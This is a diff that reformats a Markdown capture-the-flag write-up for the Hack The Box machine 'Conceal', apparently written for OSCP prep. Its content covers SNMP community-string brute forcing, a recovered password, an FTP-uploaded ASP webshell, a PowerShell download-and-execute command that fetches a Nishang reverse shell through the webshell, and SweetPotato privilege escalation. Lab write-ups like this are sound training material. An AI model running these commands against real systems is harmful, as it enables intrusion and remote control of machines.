@@ -1,7 +1,7 @@
 ---
 layout: /src/layouts/PostLayout.astro
 title: Conceal
-tags: []
+tags: ["snmpwalk", "snmp", "isakmp", "ike"]
 ---
 **Start 09:36 22-03-2025**
 
@@ -10,9 +10,9 @@ tags: []
 Scope:
 10.10.10.116
 ```
-# Recon
+## Recon
 
-## Nmap
+### Nmap
 
 The `nmap` scan wouldn't show any ports:
 
@@ -36,8 +36,9 @@ Right away I notice the following:
 
 ![](../../../assets/1fa7cf94d849efc02f59f5e93724f3d3.png)
 
->[!info]
->This then took a while to scan
+:::note
+This then took a while to scan
+:::
 
 Finally the results came in:
 
@@ -98,7 +99,7 @@ Service Info: OS: Windows 8; CPE: cpe:/o:microsoft:windows:8, cpe:/o:microsoft:w
 We notice that `snmp` even displays `netstat` for us with multiple `tcp` ports visible! 
 Other than that we've also found the `500` port to be open with the **isakmp** service, which I haven't found before.
 
-## 161/UDP - SNMP
+### 161/UDP - SNMP
 
 I brute forced the community string using `onesixtyone`:
 
@@ -125,7 +126,7 @@ Conceal
 Dudecake1!
 ```
 
-## 500/UDP - ISAKMP
+### 500/UDP - ISAKMP
 
 I proceded to check out what this service even was in the first place.
 
@@ -206,7 +207,7 @@ Host script results:
 |_  start_date: 2025-03-22T08:36:30
 ```
 
-## 21/TCP - FTP
+### 21/TCP - FTP
 
 Luckily for us port `21` has anon login, let's check it out.
 
@@ -214,7 +215,7 @@ Luckily for us port `21` has anon login, let's check it out.
 
 But it appears to be empty...
 
-## 445/TCP - SMB
+### 445/TCP - SMB
 
 ![](../../../assets/89534a714668cf95509b18edf88de35a.png)
 
@@ -224,13 +225,13 @@ Password spraying didn't yield anything either:
 
 ![](../../../assets/3eaae229252a1b40c90ef92ae48fa07a.png)
 
-## 139/TCP - RPCclient
+### 139/TCP - RPCclient
 
 ![](../../../assets/599d11208d10f6f6ad5c5dbbcb9666bd.png)
 
 No luck.
 
-## 80/TCP - HTTP
+### 80/TCP - HTTP
 
 I started up `feroxbuster` and let it enumerate the directories, while this took a super long time I found an endpoint and checked it out right away:
 
@@ -248,7 +249,7 @@ At this point I figured we could use the `ftp` server to upload a reverse shell 
 
 Indeed we can upload files!
 
-### Webshell
+## Webshell
 
 I then went ahead and tested whether I could find the files on the `/upload` endpoint:
 
@@ -271,7 +272,7 @@ I can now try and issue commands via the webshell:
 ![](../../../assets/6c3784fba1e15b3711edb33ecb73e4ff.png)
 
 
-# Foothold
+## Foothold
 
 I will now copy the `Invoke-PowerShellTcp.ps1` shell by [Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1):
 
@@ -287,7 +288,7 @@ curl http://conceal/upload/cmd.asp?cmd=powershell%20iex(New-Object%20Net.Webclie
 
 It worked, hell yeah.
 
-## Privs
+### Privs
 
 ![](../../../assets/3ccbb7e7ea87092c4f295914b3eee74c.png)
 
@@ -295,11 +296,11 @@ Makes sense since we're the service user for running the webserver.
 
 This HIGHLY LIKELY means that priv esc will at least be a bit easier.
 
-## user.txt
+### user.txt
 
 ![](../../../assets/5a7d7736e46aecda666f78dc5f7c8e41.png)
 
-# Privilege Escalation
+## Privilege Escalation
 
 I downloaded over `SweetPotato.exe` and ran it:
 
@@ -309,7 +310,7 @@ I downloaded over `SweetPotato.exe` and ran it:
 
 ![](../../../assets/f2098ac8d44a1f4e391c3754e5398f22.png)
 
-## proof.txt
+### proof.txt
 
 ![](../../../assets/494b5cf8c0fd16cefad9ec0d28d7c42a.png)
 
@@ -320,5 +321,3 @@ I downloaded over `SweetPotato.exe` and ran it:
 **Finished 19:27 22-03-2025**
 
 [^Links]: [[Hack The Box]] [[OSCP Prep]]
-
-#snmpwalk #snmp #isakmp #ike 
